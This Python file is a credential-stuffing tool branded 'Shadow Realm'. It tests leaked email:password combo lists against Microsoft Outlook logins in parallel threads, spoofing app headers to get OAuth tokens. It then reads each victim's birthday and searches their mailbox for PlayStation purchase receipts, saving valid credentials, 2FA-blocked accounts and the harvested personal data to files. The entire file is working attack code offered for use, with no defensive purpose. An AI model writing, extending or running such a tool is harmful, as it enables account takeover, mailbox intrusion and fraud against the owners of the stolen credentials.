
"""
PSN Checker - Shadow Realm
Only works with Hotmail/Outlook accounts!
"""

import requests
import json
import uuid
import re
import time
import os
from datetime import datetime
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BRIGHT_GREEN = '\033[1;92m'
    BRIGHT_YELLOW = '\033[1;93m'
    BRIGHT_BLUE = '\033[1;94m'
    BRIGHT_CYAN = '\033[1;96m'
    DIM = '\033[2m'
    END = '\033[0m'

class PSNChecker:
    def __init__(self, debug=False):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        
    def log(self, message):
        if self.debug:
            print(f"{Colors.DIM}[DEBUG] {message}{Colors.END}")
    
    def check(self, email, password):
        """Main check function - EXACT COPY from original"""
        try:
            self.log(f"Checking: {email}")
            
            # Step 1: Check email type
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "reason": "Not a valid Hotmail/Outlook account"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "reason": "Not a Microsoft account"}
            
            time.sleep(0.3)
            
            # Step 2: Get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            # Extract PPFT and post URL
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                self.log("Could not find PPFT or urlPost")
                return {"status": "BAD", "reason": "Login page parse error"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            self.log(f"PPFT found, posting to: {post_url[:50]}...")
            
            # Step 3: Post credentials
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            response_text = r3.text.lower()
            
            # Check for errors
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "BAD", "reason": "Invalid credentials"}
            
            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return {"status": "2FA"}
            
            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return {"status": "2FA"}
            
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BAD", "reason": "Account suspended"}
            
            # Get authorization code
            location = r3.headers.get("Location", "")
            if not location:
                self.log("No Location header")
                return {"status": "BAD", "reason": "No redirect"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("No auth code in redirect")
                return {"status": "BAD", "reason": "No auth code"}
            
            code = code_match.group(1)
            
            # Get CID from cookies
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("No MSPCID cookie")
                return {"status": "BAD", "reason": "No CID"}
            
            cid = mspcid.upper()
            self.log(f"CID: {cid}")
            
            # Step 4: Exchange code for token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                   data=token_data, 
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15)
            
            if "access_token" not in r4.text:
                self.log("No access token in response")
                return {"status": "BAD", "reason": "Token error"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            self.log("✓ Access token obtained, checking PSN...")
            
            # Step 5: Get birthday info
            birthday_result = self.get_birthday(email, access_token, cid)
            
            # Step 6: Check PSN (search PlayStation emails)
            psn_result = self.check_psn(email, access_token, cid)
            
            result = {
                "status": "HIT",
                "email": email,
                "password": password,
                "birthday": birthday_result.get("birthday", "Unknown"),
                "age": birthday_result.get("age", "Unknown"),
                "psn_status": psn_result.get("psn_status", "FREE"),
                "psn_orders": psn_result.get("psn_orders", 0),
                "psn_purchases": psn_result.get("purchases", [])
            }
            
            return result
            
        except requests.Timeout:
            return {"status": "BAD", "reason": "Timeout"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "BAD", "reason": "Error"}
    
    def get_birthday(self, email, access_token, cid):
        """Get birthday information from Outlook profile"""
        try:
            self.log("Getting birthday info...")
            
            # Try Microsoft Graph API first
            graph_headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}'
            }
            
            # Try profile endpoint
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            try:
                r = self.session.get(profile_url, headers=graph_headers, timeout=15)
                
                if r.status_code == 200:
                    profile_data = r.json()
                    
                    # Look for birthday in various fields
                    birthday = None
                    
                    # Check common birthday fields
                    if 'birthday' in profile_data:
                        birthday = profile_data['birthday']
                    elif 'birthDate' in profile_data:
                        birthday = profile_data['birthDate']
                    elif 'dateOfBirth' in profile_data:
                        birthday = profile_data['dateOfBirth']
                    
                    # Check in nested objects
                    if not birthday and 'personalInfo' in profile_data:
                        personal = profile_data['personalInfo']
                        if 'birthday' in personal:
                            birthday = personal['birthday']
                        elif 'birthDate' in personal:
                            birthday = personal['birthDate']
                    
                    if birthday:
                        # Parse birthday and calculate age
                        try:
                            # Try different date formats
                            for date_format in ['%Y-%m-%d', '%m/%d/%Y', '%d/%m/%Y', '%Y-%m-%dT%H:%M:%S']:
                                try:
                                    birth_date = datetime.strptime(birthday.split('T')[0], date_format.split('T')[0])
                                    today = datetime.now()
                                    age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
                                    
                                    self.log(f"Birthday found: {birth_date.strftime('%Y-%m-%d')} (Age: {age})")
                                    
                                    return {
                                        "birthday": birth_date.strftime('%Y-%m-%d'),
                                        "age": age
                                    }
                                except:
                                    continue
                        except:
                            # If can't parse, just return raw value
                            return {
                                "birthday": str(birthday),
                                "age": "Unknown"
                            }
            except:
                pass
            
            # If Graph API fails, try People API
            try:
                people_url = "https://outlook.live.com/owa/service.svc?action=GetPersonaCard"
                people_headers = {
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Outlook-Android/2.0'
                }
                
                people_data = {
                    "emailAddress": email
                }
                
                r2 = self.session.post(people_url, json=people_data, headers=people_headers, timeout=15)
                
                if r2.status_code == 200:
                    data = r2.json()
                    if 'Birthday' in data:
                        birthday = data['Birthday']
                        try:
                            birth_date = datetime.strptime(birthday.split('T')[0], '%Y-%m-%d')
                            today = datetime.now()
                            age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
                            
                            return {
                                "birthday": birth_date.strftime('%Y-%m-%d'),
                                "age": age
                            }
                        except:
                            return {
                                "birthday": str(birthday),
                                "age": "Unknown"
                            }
            except:
                pass
            
            self.log("Birthday not found")
            return {
                "birthday": "Unknown",
                "age": "Unknown"
            }
            
        except Exception as e:
            self.log(f"Birthday check error: {str(e)}")
            return {
                "birthday": "Unknown",
                "age": "Unknown"
            }
    
    def check_psn(self, email, access_token, cid):
        """Check PlayStation Network orders - EXACT COPY"""
        try:
            self.log("Searching PlayStation emails...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        
                        self.log(f"Found {total_orders} PSN emails")
                        
                        if 'Results' in result_set:
                            for result in result_set['Results'][:15]:
                                purchase_info = {}
                                
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    full_text = result.get('ItemBody', {}).get('Content', preview)
                                    
                                    # Extract game name
                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                                        r'Game:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                        r'Content:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                    ]
                                    
                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name)
                                            item_name = item_name.replace('\\r', '').replace('\\n', '')
                                            if 5 < len(item_name) < 100:
                                                purchase_info['item'] = item_name
                                                break
                                    
                                    # Try subject if no item
                                    if not purchase_info.get('item') and 'Subject' in result:
                                        subject = result['Subject']
                                        subject_patterns = [
                                            r'Your PlayStation.*?purchase.*?:\s*([^\|]+)',
                                            r'Receipt.*?:\s*([^\|]+)',
                                            r'Order.*?:\s*([^\|]+)',
                                        ]
                                        for pattern in subject_patterns:
                                            match = re.search(pattern, subject, re.IGNORECASE)
                                            if match:
                                                purchase_info['item'] = match.group(1).strip()
                                                break
                                    
                                    # Extract price
                                    price_patterns = [
                                        r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                        r'[\$€£¥]\s*(\d+[\.,]\d{2})',
                                    ]
                                    for pattern in price_patterns:
                                        price_match = re.search(pattern, full_text)
                                        if price_match:
                                            purchase_info['price'] = price_match.group(0)
                                            break
                                    
                                    # Extract date
                                    if 'ReceivedTime' in result:
                                        try:
                                            date_str = result['ReceivedTime']
                                            date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                            purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                        except:
                                            pass
                                
                                if purchase_info and purchase_info.get('item'):
                                    purchases.append(purchase_info)
                
                if total_orders > 0:
                    return {
                        "psn_status": "HAS_ORDERS",
                        "psn_orders": total_orders,
                        "purchases": purchases
                    }
                else:
                    return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
            
            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
            
        except Exception as e:
            self.log(f"PSN check error: {str(e)}")
            return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}

class ResultManager:
    def __init__(self, combo_name):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = Path(f"PSN_Results_{combo_name}_{timestamp}")
        self.base_folder.mkdir(exist_ok=True)
        
        self.hits_file = self.base_folder / "hits.txt"
        self.psn_hits = self.base_folder / "psn_hits.txt"
        self.hits_detailed = self.base_folder / "hits_detailed.txt"
        self.twofa_file = self.base_folder / "2fa.txt"
        
        self.lock = Lock()
    
    def save_hit(self, email, password, result):
        with self.lock:
            # All hits
            with open(self.hits_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
            
            # PSN specific
            if result.get('psn_orders', 0) > 0:
                with open(self.psn_hits, 'a', encoding='utf-8') as f:
                    hit_line = f"{email}:{password} | Orders: {result['psn_orders']}"
                    
                    # Add birthday if available
                    birthday = result.get('birthday', 'Unknown')
                    age = result.get('age', 'Unknown')
                    if birthday != 'Unknown':
                        hit_line += f" | Birthday: {birthday}"
                        if age != 'Unknown':
                            hit_line += f" (Age: {age})"
                    
                    f.write(hit_line + "\n")
            
            # Detailed
            with open(self.hits_detailed, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*70}\n")
                f.write(f"Email: {email}\n")
                f.write(f"Password: {password}\n")
                
                # Birthday info
                birthday = result.get('birthday', 'Unknown')
                age = result.get('age', 'Unknown')
                if birthday != 'Unknown':
                    f.write(f"Birthday: {birthday}")
                    if age != 'Unknown':
                        f.write(f" (Age: {age})")
                    f.write(f"\n")
                
                f.write(f"PSN Status: {result.get('psn_status', 'FREE')}\n")
                f.write(f"Total Orders: {result.get('psn_orders', 0)}\n")
                
                purchases = result.get('psn_purchases', [])
                if purchases:
                    f.write(f"\nPurchases:\n")
                    for i, p in enumerate(purchases, 1):
                        f.write(f"  {i}. {p.get('item', 'Unknown')}\n")
                        if p.get('price'):
                            f.write(f"     Price: {p['price']}\n")
                        if p.get('date'):
                            f.write(f"     Date: {p['date']}\n")
                
                f.write(f"{'='*70}\n")
    
    def save_2fa(self, email, password):
        with self.lock:
            with open(self.twofa_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")

class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.psn_hits = 0
        self.two_fa = 0
        self.bads = 0
        self.lock = Lock()
        self.start_time = time.time()
    
    def update(self, status, result=None):
        with self.lock:
            self.checked += 1
            
            if status == "HIT":
                self.hits += 1
                if result and result.get("psn_orders", 0) > 0:
                    self.psn_hits += 1
            elif status == "2FA":
                self.two_fa += 1
            else:
                self.bads += 1
    
    def print_live(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            bar_length = 35
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            print(f"\r{Colors.CYAN}[{bar}] {progress:.1f}%{Colors.END} | "
                  f"{Colors.BRIGHT_GREEN}✓{self.hits}{Colors.END} "
                  f"{Colors.BRIGHT_BLUE}PSN:{self.psn_hits}{Colors.END} "
                  f"{Colors.YELLOW}2FA:{self.two_fa}{Colors.END} "
                  f"{Colors.RED}✗{self.bads}{Colors.END} | "
                  f"{Colors.WHITE}{self.checked}/{self.total}{Colors.END} "
                  f"{Colors.BRIGHT_YELLOW}({cpm:.0f} CPM){Colors.END}", 
                  end='', flush=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""
{Colors.BRIGHT_CYAN}╔════════════════════════════════════════════════════════════╗
║                  PSN CHECKER (Outlook)                     ║
║                    @Shadow RealmChannels                         ║
╚════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}⚠  ONLY HOTMAIL/OUTLOOK/LIVE ACCOUNTS!{Colors.END}
{Colors.WHITE} {Colors.END}
""")

if __name__ == "__main__":
    try:
        while True:
            clear()
            banner()
            
            print(f"{Colors.CYAN}1.{Colors.END} Start Check")
            print(f"{Colors.CYAN}2.{Colors.END} Exit\n")
            
            choice = input(f"{Colors.BRIGHT_YELLOW}Choice:{Colors.END} ").strip()
            
            if choice == "2":
                break
            
            if choice == "1":
                combo_file = input(f"\n{Colors.BRIGHT_YELLOW}Combo file:{Colors.END} ").strip()
                
                if not os.path.exists(combo_file):
                    print(f"{Colors.RED}✗ File not found!{Colors.END}")
                    input(f"\n{Colors.CYAN}Press Enter...{Colors.END}")
                    continue
                
                with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [l.strip() for l in f if l.strip() and ':' in l]
                
                if not lines:
                    print(f"{Colors.RED}✗ No valid combos!{Colors.END}")
                    input(f"\n{Colors.CYAN}Press Enter...{Colors.END}")
                    continue
                
                print(f"\n{Colors.WHITE}Threads:{Colors.END}")
                print(f"  1. Low (5 threads) - Recommended")
                print(f"  2. Serial (10 thread)")
                print(f"  3. Custom")
                
                t_choice = input(f"\n{Colors.BRIGHT_YELLOW}Choice:{Colors.END} ").strip()
                
                if t_choice == "1":
                    threads = 5
                elif t_choice == "2":
                    threads = 10
                elif t_choice == "3":
                    threads = int(input(f"{Colors.BRIGHT_YELLOW}Threads (10-50):{Colors.END} ").strip())
                    threads = max(1, min(10, threads))
                else:
                    threads = 30
                
                clear()
                banner()
                
                print(f"{Colors.BRIGHT_GREEN}Starting check...{Colors.END}")
                print(f"Combos: {len(lines)} | Threads: {threads}\n")
                
                combo_name = os.path.basename(combo_file).replace('.txt', '')
                result_mgr = ResultManager(combo_name)
                stats = LiveStats(len(lines))
                
                def process(line_data):
                    line, idx = line_data
                    try:
                        parts = line.split(':', 1)
                        if len(parts) != 2:
                            stats.update("BAD")
                            stats.print_live()
                            return
                        
                        email = parts[0].strip()
                        password = parts[1].strip()
                        
                        checker = PSNChecker(debug=False)
                        result = checker.check(email, password)
                        
                        stats.update(result["status"], result if result["status"] == "HIT" else None)
                        
                        if result["status"] == "HIT":
                            orders = result.get("psn_orders", 0)
                            birthday = result.get("birthday", "Unknown")
                            age = result.get("age", "Unknown")
                            
                            # Build output string
                            output_parts = [f"\n{Colors.BRIGHT_GREEN}✓ {email[:35]}{Colors.END}"]
                            
                            # Add birthday if available
                            if birthday != "Unknown":
                                if age != "Unknown":
                                    output_parts.append(f"{Colors.MAGENTA}🎂{birthday}({age}y){Colors.END}")
                                else:
                                    output_parts.append(f"{Colors.MAGENTA}🎂{birthday}{Colors.END}")
                            
                            # Add PSN info
                            if orders > 0:
                                purchases = result.get("psn_purchases", [])
                                item = purchases[0]['item'][:25] if purchases and purchases[0].get('item') else "N/A"
                                output_parts.append(f"{Colors.BRIGHT_BLUE}PSN:{orders}({item}){Colors.END}")
                            else:
                                output_parts.append(f"{Colors.WHITE}PSN:FREE{Colors.END}")
                            
                            print(" ".join(output_parts))
                            result_mgr.save_hit(email, password, result)
                        
                        elif result["status"] == "2FA":
                            print(f"\n{Colors.YELLOW}🔐 {email[:35]}{Colors.END}")
                            result_mgr.save_2fa(email, password)
                        
                        stats.print_live()
                        time.sleep(0.8)  # Rate limiting
                        
                    except Exception as e:
                        stats.update("BAD")
                        stats.print_live()
                
                if threads == 1:
                    for i, line in enumerate(lines, 1):
                        process((line, i))
                else:
                    with ThreadPoolExecutor(max_workers=threads) as executor:
                        executor.map(process, [(l, i) for i, l in enumerate(lines, 1)])
                
                with stats.lock:
                    elapsed = time.time() - stats.start_time
                    cpm = (stats.checked / elapsed * 60) if elapsed > 0 else 0
                
                print(f"\n\n{Colors.BRIGHT_CYAN}{'='*60}{Colors.END}")
                print(f"{Colors.BRIGHT_YELLOW}RESULTS:{Colors.END}")
                print(f"  {Colors.BRIGHT_GREEN}✓ Hits: {stats.hits}{Colors.END}")
                print(f"  {Colors.BRIGHT_BLUE}🎯 PSN: {stats.psn_hits}{Colors.END}")
                print(f"  {Colors.YELLOW}🔐 2FA: {stats.two_fa}{Colors.END}")
                print(f"  {Colors.RED}✗ Bad: {stats.bads}{Colors.END}")
                print(f"  {Colors.WHITE}CPM: {cpm:.0f}{Colors.END}")
                print(f"{Colors.BRIGHT_CYAN}{'='*60}{Colors.END}")
                
                if stats.hits > 0:
                    print(f"\n{Colors.BRIGHT_GREEN}✓ Saved to: {result_mgr.base_folder}{Colors.END}")
                
                input(f"\n{Colors.CYAN}Press Enter...{Colors.END}")
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Stopped!{Colors.END}\n")
    except Exception as e:
        print(f"\n{Colors.RED}Error: {str(e)}{Colors.END}")
